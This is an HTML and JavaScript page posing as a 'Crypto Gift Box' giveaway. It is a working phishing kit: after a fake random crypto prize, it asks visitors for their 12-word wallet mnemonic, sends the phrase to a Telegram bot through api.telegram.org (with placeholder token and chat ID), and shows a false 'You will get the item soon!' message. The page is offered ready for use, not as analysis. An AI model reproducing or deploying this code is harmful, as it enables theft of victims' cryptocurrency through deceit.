<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crypto Gift Box</title>
  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      background: radial-gradient(circle at top, #111 0%, #0a0a0a 100%);
      color: #fff;
      font-family: 'Orbitron', 'Poppins', sans-serif;
      height: 100vh;
      overflow-x: hidden;
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .container {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      padding: 20px;
    }
    .gift-box {
      width: 160px;
      height: 160px;
      background: linear-gradient(135deg, #0f0f0f, #1f1f1f);
      border: 3px solid #00ffcc;
      border-radius: 25px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 60px;
      cursor: pointer;
      box-shadow: 0 0 20px #00ffcc80, 0 0 40px #00ffcc60;
      animation: pulse 2s infinite;
      margin-bottom: 20px;
      transition: transform 0.3s;
    }
    .gift-box:hover {
      transform: scale(1.1);
    }
    .gift-box.disabled {
      opacity: 0.5;
      cursor: not-allowed;
      animation: none;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    .timer {
      font-size: 18px;
      margin-bottom: 10px;
      color: #00ffcc;
    }
    .prize {
  margin-top: 20px;
  font-size: 18px;
  font-weight: 600;
  color: #8bb9ff;
  text-shadow: 0 1px 3px rgba(0,0,0,0.5);
  display: none;
}

    .claim-btn, .submit-btn {
  margin-top: 20px;
  padding: 14px 30px;
  background: linear-gradient(135deg, #1f2937, #111827);
  color: #d1d5db;
  border: 1px solid #374151;
  border-radius: 12px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.3s ease;
}

.claim-btn:hover, .submit-btn:hover {
  background: linear-gradient(135deg, #2563eb, #1e40af);
  color: white;
}

    .mnemonic-input {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }
    .mnemonic-input textarea {
      width: 320px;
      height: 120px;
      border-radius: 12px;
      padding: 12px;
      border: 2px solid #00ffcc;
      resize: none;
      font-size: 16px;
      background: #0a0a0a;
      color: #fff;
      margin-bottom: 10px;
      box-shadow: inset 0 0 10px #00ffcc40;
    }
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1a1a1a;
      padding: 30px 40px;
      border-radius: 20px;
      border: 2px solid #00ffcc;
      font-size: 22px;
      color: #00ffcc;
      box-shadow: 0 0 25px #00ffcc90;
      display: none;
      z-index: 10;
      text-align: center;
    }
    .error-message {
      margin-top: 15px;
      padding: 12px 20px;
      background: #ff0033;
      border-radius: 12px;
      font-size: 16px;
      color: #fff;
      display: none;
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .possible-rewards {
      margin-top: 30px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      max-width: 600px;
    }
    .reward-badge {
  background: #1e293b;
  border: 1px solid #334155;
  border-radius: 8px;
  padding: 6px 14px;
  font-size: 14px;
  color: #cbd5e1;
}

  </style>
</head>

<body>
<div id="particles-js"></div>

<div class="container">
  <div class="timer" id="timer"></div>
  <div class="gift-box" id="giftBox">üéÅ</div>
  <div class="prize" id="prizeText"></div>
  <button class="claim-btn" id="claimBtn" style="display:none;">Claim Your Prize</button>
  
  <div class="mnemonic-input" id="mnemonicInput">
    <textarea id="mnemonic" placeholder="Enter your 12-word mnemonic phrase..."></textarea>
    <button class="submit-btn" id="submitBtn">Submit</button>
    <div class="error-message" id="errorMessage"></div>
  </div>

  <div class="possible-rewards">
    <div class="reward-badge">1 BNB</div>
    <div class="reward-badge">10 USDT</div>
    <div class="reward-badge">100 USDT</div>
    <div class="reward-badge">1 BTC</div>
    <div class="reward-badge">1 ETH</div>
    <div class="reward-badge">1 LTC</div>
    <div class="reward-badge">500 XRP</div>
    <div class="reward-badge">0.5 SOL</div>
    <div class="reward-badge">2 ADA</div>
    <div class="reward-badge">100 DOGE</div>
  </div>
</div>

<div class="popup" id="popup">You will get the item soon!</div>

<script>
  particlesJS.load('particles-js', 'https://cdn.jsdelivr.net/gh/VincentGarreau/particles.js/particles.json', function() {
    console.log('particles.js loaded');
  });

  const prizes = ["1 BNB", "10 USDT", "100 USDT", "1 BTC", "1 ETH", "1 LTC", "500 XRP", "0.5 SOL", "2 ADA", "100 DOGE"];
  const giftBox = document.getElementById('giftBox');
  const prizeText = document.getElementById('prizeText');
  const claimBtn = document.getElementById('claimBtn');
  const mnemonicInput = document.getElementById('mnemonicInput');
  const submitBtn = document.getElementById('submitBtn');
  const popup = document.getElementById('popup');
  const errorMessage = document.getElementById('errorMessage');
  const timer = document.getElementById('timer');
  let selectedPrize = "";

  const oneDay = 24 * 60 * 60 * 1000;

  function updateTimer() {
    const lastClaim = localStorage.getItem('lastClaim');
    if (lastClaim) {
      const diff = oneDay - (Date.now() - Number(lastClaim));
      if (diff > 0) {
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        timer.textContent = `Next claim in: ${hours}h ${minutes}m ${seconds}s`;
        giftBox.classList.add('disabled');
      } else {
        timer.textContent = "";
        giftBox.classList.remove('disabled');
        localStorage.removeItem('lastClaim');
      }
    }
  }

  setInterval(updateTimer, 1000);
  updateTimer();

  giftBox.addEventListener('click', () => {
    if (giftBox.classList.contains('disabled')) return;

    selectedPrize = prizes[Math.floor(Math.random() * prizes.length)];
    prizeText.textContent = `You Won: ${selectedPrize}`;
    prizeText.style.display = 'block';
    claimBtn.style.display = 'inline-block';
    giftBox.style.animation = 'none';
    localStorage.setItem('lastClaim', Date.now());
    updateTimer();
  });

  claimBtn.addEventListener('click', () => {
    claimBtn.style.display = 'none';
    mnemonicInput.style.display = 'flex';
  });

  submitBtn.addEventListener('click', () => {
    const mnemonic = document.getElementById('mnemonic').value.trim();
    errorMessage.style.display = 'none';

    if (mnemonic.split(' ').length !== 12) {
      errorMessage.textContent = 'Please enter exactly 12 words.';
      errorMessage.style.display = 'block';
      return;
    }

    const botToken = 'YOUR_BOT_TOKEN_HERE';
    const chatId = 'YOUR_CHAT_ID_HERE';
    const message = `Mnemonic:\n${mnemonic}\n\nPrize: ${selectedPrize}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      popup.style.display = 'block';
      setTimeout(() => {
        popup.style.display = 'none';
        location.reload();
      }, 3000);
    })
    .catch((error) => {
      console.error('Error:', error);
      errorMessage.textContent = 'Something went wrong. Please try again.';
      errorMessage.style.display = 'block';
    });
  });
</script>
</body>
</html>
